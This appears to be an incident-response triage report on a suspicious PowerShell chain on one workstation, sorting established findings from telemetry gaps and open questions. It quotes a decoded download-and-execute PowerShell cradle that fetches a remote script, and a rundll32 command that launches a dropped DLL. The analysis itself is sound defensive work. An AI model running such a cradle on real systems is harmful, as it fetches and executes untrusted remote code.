supporting_observations.claim: At 13:44:40 UTC on WS-MLOPEZ-01, Word opened C:\Users\maria.lopez\Downloads\Statement.docm under maria.lopez. At 13:44:46, that Word process spawned PowerShell with -nop -w hidden -enc.

The encoded PowerShell command decodes to IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/harbor-dental-it/tools/main/u.ps1'), instructing PowerShell to retrieve and execute remote script text.

The script request returned HTTP 200. Its proxy tunnel ID PT-760fe1cf7e7c29f8 and client source port 55925 connect the inspected GET to PowerShell PID 3348 through endpoint network records. Attribution therefore does not depend on the separate browser-user-agent CONNECT record.

At 13:44:48 UTC, the same PowerShell process spawned rundll32.exe with C:\Users\maria.lopez\AppData\Roaming\svchelper.dll,Init as its argument. This establishes a subsequent DLL-execution attempt, not successful execution of the DLL's contents.

The document-to-hidden-encoded-PowerShell chain, corroborated remote script retrieval, and subsequent rundll32 invocation support a malicious-activity finding for the reported workstation PowerShell activity. The recorded command and ancestry differ from the supplied approved patching practice; an organization-like repository name does not establish authorization.
The suspicious PowerShell process terminated at 13:45:11 UTC, approximately 25 seconds after creation. Its timing is near, but not exactly at, the ticket's approximate 13:40 report.

known_telemetry_limitations: The HTTP 200 GET establishes successful retrieval at the HTTP level, but the supplied proxy record does not include the script response body (T023-00089).
The rundll32 process-creation records show the DLL invocation, but do not include a corresponding DLL-load result or payload behavior (T023-00096, T023-00097).
The recorded suspicious PowerShell launch was at 13:44:46 and requested a hidden window; the evidence does not conclusively identify it as the window the user saw around 13:40 (T023-00085).
claims_not_established: Whether Statement.docm used a macro, an exploit, or another document-triggered mechanism to launch PowerShell; parent-child attribution alone does not establish that mechanism (T023-00081, T023-00085).
The contents and provenance of u.ps1 and svchelper.dll, including whether the downloaded script created that DLL (T023-00089, T023-00096).
Successful DLL initialization, persistence, credential theft, lateral movement, or data exfiltration by this execution chain (T023-00085, T023-00089, T023-00096).
additional_evidence_needed: Preserve and analyze Statement.docm and svchelper.dll, including hashes, signatures, document code, and file provenance.
Recover the historical u.ps1 response from proxy retention or endpoint artifacts; collect PowerShell script-block, module, and AMSI telemetry.
Collect DLL-load telemetry, endpoint memory and detection results, and subsequent process/network activity to determine payload execution and impact.
Confirm the user's approximate observation time and validate the document and script's authorization with IT.
unrelated_findings: Separate credential-use review: scheduled-task-launched PowerShell ran C:\Scripts\endpoint-inventory.ps1 as SYSTEM and used explicit svc-bkp credentials targeting PROXY-HD-01. This differs from the supplied backup-account role; no connection to the alerted document chain is established (T023-00165, T023-00168).

Separate software/service review: Citrix SelfService.exe executed, and Edge successfully requested Slack's client page. These are outside the supplied approved services; they do not decide this alert (T023-00173, T023-00174, T023-00176, T023-00180).

Separate configuration review: explorer.exe set maria.lopez's ProxyEnable value to 0 at 13:58:16. The record does not establish a connection to the alerted PowerShell process or actual proxy bypass (T023-00155).
